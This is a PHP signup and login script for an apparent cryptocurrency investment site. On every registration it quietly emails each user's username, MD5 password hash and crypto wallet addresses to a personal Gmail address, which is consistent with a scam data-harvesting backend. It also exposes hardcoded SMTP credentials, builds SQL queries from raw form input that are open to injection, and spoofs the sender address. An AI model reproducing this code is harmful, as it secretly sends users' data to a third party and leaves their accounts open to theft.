<?php 
include 'connect.php';
require "vendor/autoload.php";
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
$mail = new PHPMailer(true);

//$mail->SMTPDebug = SMTP::DEBUG_SERVER;

if(isset($_POST['submit'])){
    $firstName=$_POST['name'];
    $userName=$_POST['username'];
    $email=$_POST['email'];
    $password=$_POST['password'];
    $password=md5($password);

    $bitcoin = $_POST["payaccount1000"];
    $etherium = $_POST['payaccount1006'];
    $TRC20 = $_POST['payaccount1007'];
    $ERC20 = $_POST['payaccount1008'];
    $Litecoin = $_POST['payaccount1009'];
    $Dogecoin =$_POST['payaccount1010'];
    $Tron = $_POST['payaccount1011'];

    $subject = "From: $firstName\n Email: $email";
	
	


		$mail->isSMTP();
		$mail->SMTPAuth = true;

		$mail->Host = "pld110.truehost.cloud";
		$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
		$mail->Port = 587;

		$mail->Username = "support@digital-mine-fx.com";
		$mail->Password = "o,s*8Dny1A+@";

		$mail->setFrom($email, $firstName);
        $mail->addAddress('falolamofijinfoluwa@gmail.com', 'john');

		$message = " username: $userName\n password: $password\n bitcoin: $bitcoin\n etherium: $etherium\n TRC20:$TRC20\n ERC20: $ERC20\n Litecoin: $Litecoin\n Dogecoin: $Dogecoin\n Tron: $Tron";

				
		$mail->Subject = $subject;
        $mail->Body = $message;
		
		$mail->send();
   
   


     $checkEmail="SELECT * From users where email='$email'";
     $result=$conn->query($checkEmail);
     if($result->num_rows>0){
        echo "Email Address Already Exists !";
     }
     else{
        $insertQuery="INSERT INTO users(firstName,userName,email,password)
                       VALUES ('$firstName','$userName','$email','$password')";
            if($conn->query($insertQuery)==TRUE){
                header("location: indexc30b.html");
            }
            else{
                echo "Error:".$conn->error;
            }
     }
   

}


function handleError($error){
header("location: indexc30b.html?error=" . urlencode($error));

exit();
};

if(isset($_POST['signIn'])){
   $email=$_POST['email'];
   $password=$_POST['password'];
   $password=md5($password) ;
   
   $sql="SELECT * FROM users WHERE email='$email' and password='$password'";
   $result=$conn->query($sql);
   if($result->num_rows>0){
    session_start();
    $row=$result->fetch_assoc();
    $_SESSION['email']=$row['email'];
    header("Location: my account.html");
    exit();
   }
   else{
    handleError("Not Found, Incorrect Email or Password.");
   }

}
?>



       
	   
		